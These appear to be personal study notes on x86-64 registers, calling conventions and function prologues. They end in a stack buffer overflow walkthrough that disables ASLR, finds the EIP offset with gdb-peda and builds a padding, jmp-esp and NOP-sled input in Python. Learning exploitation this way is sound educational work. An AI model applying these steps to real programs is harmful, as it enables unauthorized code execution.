CPU
    ISA - Instruction Set Architecture      each CPU has their own
        instruction - Command to CPU
    GPR - General Purpose Register          8 in x86,   16 in x86-64,   16 in ARM

The Stack
    Starts at bottom (highest addr), builds up (lower addr)
    
Registers (x86 64) - 64 bit variables
    rip         - Instruction Pointer       What Executes next

    Stack Pointers - keeps track of the stack frame of the Currently Executing Function:
        rsp     - Stack Pointer (top of stack addr)
        rbp     - Base Pointer (bottom)

    General Purpose/Special Function:
        rax     - usually used for return values
        rbx
        rcx
        rdx

    Data:
        rsi     - Source Index
        rdi     - Destination Index

    Others:
        r8-15

    Address different parts of a register:
        0x1122334455667788
          ================  rax (64 bits)
                  ========  eax (32 bits)
                      ====  ax  (16 bits)
                      ==    ah  (8 bits)
                        ==  al  (8 bits)

    System Calls #https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux:
        rax     - syscall number
        rdi     - arg0
        rsi     - arg1
        rdx     - arg2
        r10     - arg3
        r8      - arg4
        r9      - arg5
    
    Function Calls / Library Calls
        rax     - return value
        rdi     - arg0
        rsi     - arg1
        rdx     - arg2
        rcx     - arg3
        r8      - arg4
        r9      - arg5

Assembly Instructions
    Intel   <instruction>   <dst>, <src>
    AT&T    <instruction>   <src>, <dst>

    Instructions:
        push    <S>     #push source onto stack
        pop     <D>     #pop top of stack (rsp) into destination
        lea     <D> <S> #Load Effective Address     puts addr of S into D 

    Effects of Instructions:
        Sets CPU flags
            ZF      - zero flag
                    used with cmp, jump, test
        Do stuff to stack:
            push, pop, call, leave, ret

    Control Flow - modify instruction pointer:
        call        - set rip to starting addr of function being called
        jump        - set rip to anywhere?


Function Prologue and Epilogue
    1.) call    <address>       #push return addr and jump to specified location
            same as:
                push    rip+len(instruction)    #push return addr (one past the call)
                jmp     <address>

    2.) Function Prologue - sets up a new stack frame:
            push    rbp         #saves the current rbp to stack
            mov     rbp, rsp    #set rbp = rsp (making the stack 0 bytes in size)
            sub     rsp, 0x20   #sets rsp higher, making gap between rsp and rbp

    3.) Function Epilogue
            leave
                same as:
                    mov     rsp, rbp    #moves top of stack down to rbp
                    pop     rbp
            ret
                same as:
                    pop     rip

Common? C Functions:
    sscanf(...)
    fgets(...)
    getenv(...)
    strcmp(...)
    fopen(...)
        takes 'r', 'w'... parameters
    gets()  - vulnerable to buffer overflow
        



Buffer Overflow

    OS controlled
        ASLR    - randomizes memory layout of a program's execution

    Compiler controlled
        NX bit  - prevent code exe inside the stack
        PIE/PIC - removes absolute address of Global Offset Table

        Stack Canaries / Stack Cookie put before the base pointer on the stack. If modified, program will crash
            Segment Registers (GS/FS) create these


    gets()  - takes unbound input
    fgets() - take bound input

        char var1 [64] #64 bytes allocated
        fgets(var1,512,stdin)   #can take 512 bytes. overwrite 

    Check if ASLR is enabled
        cat /proc/sys/kernel/randomize_va_space
            0 - off
            1 - some randomization
            2 - full randomization

    Fuzzing - sending random but targeted input to binary
    

    1.) disable ASLR    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

    2.) make a buffer
        sudo apt install nasm
        gdb-peda:
            pattern_create 100

            file <program>  #run
            run
            {copy and paste pattern}
            pattern_offset <whatever EIP was>       #This is the buffer size (62 for this example)

            pattern_create <len of new pattern>

            break * main


            info proc map           #list of accessible areas in memories
            asmsearch "jmp esp"     #find virtual memory addr that points to jmp esp (ffe4)
            asmsearch "call esp"
            break * <addr that jmp/call esp is at>
            



            Examine command https://visualgdb.com/gdbreference/commands/x                
                #examine memory that program has access to
                #x - examine    /   1x  - one 32 bit hex addr   <address>   - from this address
                x/1x <EIP addr or whatever>     #displays whats inside
                x/1i <EIP..>                    #displays instruction in that addr
                x/40x $esp                      #40 32 bit memory addr from esp (displays stack)

            1.) Create a buffer: 

            Python:
                buffer = A * 62 #buffer size
                print(buffer)
            python3 exploit.py > exp        #save output to file

            run < exp       #send exp into stdin for program. 
            
            2.) Find and add a memory address to jump to esp (trying to overwrite EIP w/ the jmp esp)

            #use asmsearch
            Python: #compile w/ python not python3
                buffer 'A' * 62
                #0x56555683
                #0x56556683 these are 2 mem addr w/ jmp esp
                esp = b'\x56\x83\x56\x55'        #converted from little endian

                print(buffer + esp)

            file <program>
            break * 0x56555683            
            r < exp

            3.) NOP sled

            Python:
                buffer 'A' * 62
                #0x56555683
                #0x56556683 these are 2 mem addr w/ jmp esp
                esp = b'\x56\x83\x56\x55'        #converted from little endian

                nop = b'\x90' * 32  #nop sled                

                print(buffer + esp + nop)
